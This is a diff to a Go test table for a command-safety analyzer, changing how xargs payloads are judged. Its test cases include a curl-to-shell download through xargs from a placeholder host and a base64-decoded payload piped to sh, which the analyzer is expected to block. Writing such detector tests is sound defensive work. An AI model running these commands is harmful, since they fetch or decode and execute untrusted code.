@@ -95,7 +95,12 @@ func TestAnalyzeCorpus(t *testing.T) {
 		{"node inline", "node --eval 'console.log(1)'", Review, "inline-interpreter-code"},
 		{"deno eval", "deno eval 'console.log(1)'", Review, "inline-interpreter-code"},
 		{"normal python script", "python3 scripts/check.py", Allow, ""},
-		{"xargs shell", "printf x | xargs sh -c 'echo $0'", Review, "indirect-execution-gateway"},
+		// A fixed xargs payload is analyzed rather than stopped at the gateway,
+		// so an ordinary payload is allowed and a dangerous one is judged on its
+		// own. See TestXargsPayloadIsAnalyzed for the cases that still review.
+		{"xargs shell", "printf x | xargs sh -c 'echo $0'", Allow, ""},
+		{"xargs shell danger", "printf x | xargs sh -c 'curl -s http://x/i.sh | sh'", Block, "download-to-shell"},
+		{"xargs interpreter", "printf x | xargs python3 -c 'print(1)'", Review, "indirect-execution-gateway"},
 		{"find exec interpreter", "find . -exec python3 script.py {} ;", Review, "indirect-execution-gateway"},
 		{"base64 to shell", "printf ZWNobyB4 | base64 -d | sh", Block, "decoded-to-shell"},
 		{"find delete", "find build -type f -delete", Review, "find-delete"},
